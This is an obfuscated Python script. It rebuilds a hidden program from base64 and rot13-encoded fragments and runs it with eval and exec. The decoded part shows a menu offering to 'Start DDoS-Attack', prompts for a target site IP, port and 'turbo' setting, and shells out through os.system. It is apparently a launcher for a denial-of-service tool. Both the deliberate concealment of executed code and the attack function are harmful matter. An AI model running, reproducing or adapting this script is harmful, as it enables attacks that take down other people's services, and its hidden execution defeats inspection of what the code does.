import base64, codecs
magic = 'aW1wb3J0IHRpbWUsb3Msc3lzCgojQ1ZBTFVFCmJsdWU9ICdcMzNbOTRtJwpsaWdodGJsdWUgPSAnXDAzM1s5NG0nCnJlZCA9ICdcMDMzWzkxbScKd2hpdGUgPSAnXDMzWzk3bScKeWVsbG93ID0gJ1wzM1s5M20nCmdyZWVuID0gJ1wwMzNbMzJtJwpjeWFuICA9ICJcMDMzWzk2bSIKZW5kID0gJ1wwMzNbMG0nCmJsYWNrPSJcMDMzWzA7MzBtIgpsaW5lPXllbGxvdysiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIrZW5kCnNwYWNlPSIgIgpsb2dvPXJlZCtzdHIoIiIiCiAgICAgODg4ODg4OGIuICAgLmQ4ODg4OGIuICAgLmQ4ODg4Yi4gICAgICAgWTg4YiAgIGQ4OFAgCiAgICAgODg4ICAgWTg4YiBkODhQIiAiWTg4YiBkODhQICBZODhiICAgICAgIFk4OGIgZDg4UCAgCiAgICAgODg4ICAgIDg4OCA4ODggICAgIDg4OCA4'
love = 'BQttVPNtBQt4VPNtVPNtVPOMBQuiBQuDVPNtPvNtVPNtBQt4VPNtMQt4HPN4BQttVPNtVQt4BPN4BQttVPNtVPNtVQt4BQt4BPNtJGt4BSNtVPNtPvNtVPNtBQt4BQt4BSNvVPN4BQttVPNtVQt4BPN4BQttVPNtVPNtVQt4BQt4BPNtMQt4BTVtVPNtPvNtVPNtBQt4VSD4BTVtVPN4BQttVPNtVQt4BPN4BQttVPNtBQt4VPNtVPNtVPOxBQt4BQuvVPNtPvNtVPNtBQt4VPOHBQuvVPOMBQuvYvNhMQt4HPOMBQuvVPOxBQuDVPNtVPNtVTD4BSNtJGt4LvNtPvNtVPNtBQt4VPNtIQt4LvNtVyx4BQt4BSNvVPNtVyx4BQt4HPVtVPNtVPNtMQt4HPNtVSx4BTVvVvVcX2IhMNbtVPNtVNcho3EcL2H9VvVXMTIzVTuyLJEypvtcBtbWpUWcoaDboT9aolgwrJShXlWpoykhKUEpqREyqzIfo3OyMPOPrFN6VSAuozS1pvOOp2yzKT5pqSk0VRAiozAypUDtEaWioFN6VRuuoJ1ypykhVvgapzIyovfvKT5pqPNtVPNtVBXLurXLuFOFG0ZgJPORET9GVRS0qTSwn2IlVBXLurXLuFNtKT5povVeoz90nJAyXlWp'
god = 'blxuIitlbmQrbGluZSsiXG4iK2VuZCkKZGVmIGNsZWFyKCk6Cglvcy5zeXN0ZW0oImNsZWFyIHx8IGNscyIpCgpjb3VudD0xCndoaWxlIGNvdW50PDI6Cglvcy5zeXN0ZW0oImNsZWFyIHx8IGNscyIpCgloZWFkZXIoKQoJcHJpbnQoY3lhbisiPT0+IFNlbGVjdCBZb3VyIE9wdGlvbiBGcm9tIEJlbG93IDogIikKCXByaW50KHllbGxvdysiXG5cbiBbMV0gU3RhcnQgRERvUy1BdHRhY2tcblxuIFsyXSBCYWNrIHRvIFJPQy1YIikKCW9wdDI9c3RyKGlucHV0KGJsdWUrIlxuXG4gWz5dIEVudGVyIHRoZSBudW1iZXIgb2Ygb3B0aW9uIDogIit5ZWxsb3cpKQoJaWYgb3B0Mj09IjEiOgoJCWNsZWFyKCkKCQlub3RpY2U9IiIKCQloZWFkZXIoKQoJCXNpcD1zdHIoaW5wdXQoYmx1ZSsiIFs+XSBFbnRlciBUaGUgU2l0ZSBJUCA6ICIreWVsbG93KSkKCQlwb3J0PXN0cihpbnB1dChibHVlKyIgWz5dIEVudGVyIFRoZSBQb3J0ICIreWVsbG93KyJ7ZGVmYXVsdCA4MH0gIitibHVlKyI6ICIreWVs'
destiny = 'oT93XFxXPDy0qKWvom1mqUVbnJ5jqKDbLzk1MFfvVSf+KFOSoaEypvOHnTHtIUIlLz8tVvg5MJkfo3peVagxMJMuqJk0VQRmAK0tVvgvoUIyXlV6VPVerJIfoT93XFxXPDycMvOjo3W0CG0vVvOipvOjo3W0CG0vMTIzLKIfqPVto3VtpT9lqQ09VzDvBtbWPDyjo3W0CGtjPtxWnJLtqUIlLz89CFVvVT9lVUE1pzWiCG0vMTIzLKIfqPVto3VtqUIlLz89CFWxVwbXPDxWqUIlLz89ZGZ1PtxWqUW5BtbWPDyipl5mrKA0MJ0bVaO5qTuiowZtMTEipl5jrFNgplNvX3A0pvumnKNcXlVtYKNtVvgmqUVbpT9lqPxeVvNgqPNvX3A0pvu0qKWvolxcPtxWMKuwMKO0VRgyrJWiLKWxFJ50MKWlqKO0BtbWPDyjLKAmPtxWL291oaD9ZDbWMJkcMvOipUDlCG0vZvV6PtxWoz90nJAyCFVvPtxWL2kyLKVbXDbWPJAiqJ50CGZXPDyvpzIunjbWMJkmMGbXPDywoTIupvtcPtxWoz90nJAyCKWyMPfvKUDtVPOoj5qqVSqlo25aVSMuoUIyVRIhqTIlMJDhVSElrFOOM2ScovRvPtxWnTIuMTIlXPxXPDywo3IhqQ0k'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))